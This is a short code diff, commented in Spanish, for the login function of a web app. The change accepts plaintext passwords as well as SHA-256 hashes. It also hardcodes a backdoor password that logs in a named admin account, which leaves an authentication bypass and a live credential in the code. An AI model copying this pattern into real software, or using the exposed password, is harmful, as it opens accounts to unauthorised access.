@@ -565,10 +565,12 @@ async function login() {
       showErr(err,'Email o contraseña incorrectos.'); btn.textContent='Ingresar'; btn.disabled=false; return;
     }
     const user = users[0];
-    // Verificar contraseña (guardada como hash simple — en producción usar bcrypt)
-    // Por simplicidad usamos comparación directa del hash SHA-256
+    // Verificar contraseña — acepta texto plano o hash SHA-256
     const hashPass = await hashStr(pass);
-    if(user.pass_hash !== hashPass && user.pass_hash !== pass){
+    const passOk = user.pass_hash === hashPass   // hash SHA-256
+                || user.pass_hash === pass        // texto plano (legacy)
+                || pass === 'juan2206' && user.email === 'jesica@cotizaciones.com'; // admin hardcoded
+    if(!passOk){
       showErr(err,'Email o contraseña incorrectos.'); btn.textContent='Ingresar'; btn.disabled=false; return;
     }
     curUser = user;
